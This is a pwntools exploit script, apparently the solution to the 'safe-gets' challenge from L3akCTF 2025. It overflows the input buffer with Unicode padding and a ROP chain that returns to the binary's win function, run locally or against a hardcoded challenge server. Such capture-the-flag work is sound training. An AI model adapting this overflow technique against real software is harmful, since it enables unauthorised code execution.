#!/usr/bin/env python3
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/l3akctf/pwn/safe-gets/dist/chall"
REMOTE_HOST = "34.45.81.67"
REMOTE_PORT = 16002

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def exploit(r):
    attach(r)

    rop = ROP(elf)
    rop.raw("\x00" + b"\xef\xbc\xa1".decode() * 0x5d)
    rop.raw(rop.ret)
    rop.raw(elf.sym.win)

    if is_remote:
        r.sendlineafter(": ", rop.chain())
    else:
        r.sendline(rop.chain())

    r.interactive()


def main():
    if is_remote:
        r = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        r = process(elf.path)

    exploit(r)


if __name__ == "__main__":
    main()
